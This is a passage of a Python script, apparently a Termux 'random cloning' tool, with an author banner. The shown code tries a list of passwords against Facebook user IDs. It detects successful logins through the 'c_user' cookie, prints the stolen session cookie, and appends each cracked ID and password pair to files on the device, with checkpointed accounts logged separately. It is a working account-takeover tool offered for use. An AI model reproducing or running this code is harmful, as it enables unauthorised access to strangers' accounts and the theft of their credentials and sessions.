...
# Facebook: MR-ROSID King
# Github: MR-ROSID-King
...
logo =("""\033[0;92m
  ...
  \033[1;32m|    \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mRosid               \033[1;92m|
  \033[1;32m|    \033[1;32m[✓] FACEBOK      : \033[1;34m Md abdul Rosid     \033[1;92m|
  \033[1;32m|    \033[1;35m[✓] GITHUB       :  \033[1;35mRosid456     \033[1;92m|
  \033[1;32m|    \033[1;36m[✓] TOOL STATUS  : \033[1;36m RANDOM CLONING         \033[1;92m|
  \033[1;32m|    \033[1;37m[✓] TEAM         \033[1;91m: \033[1;92m CVS\033[1;92m|
  \033[1;32m|    \033[1;36m[✓] TOOL VIRSION :  \033[1;36m1.0.9                  \033[1;92m|
  \033[1;92m×××××××××××××××××\033[1;92m×××××××××××××××\033[1;92m×××××××××××××××××
  \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m ASSALAMU ALAIKUM ........
  \033[1;92m×××××××××××××××××\033[1;92m×××××××××××××××\033[1;92m×××××××××××××××××
  \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m ROSID TERMUX HELPING ZONE.........
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[MR-ROSID-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MR-ROSID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[MR-ROSID-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/MR-ROSID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MR-ROSID{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
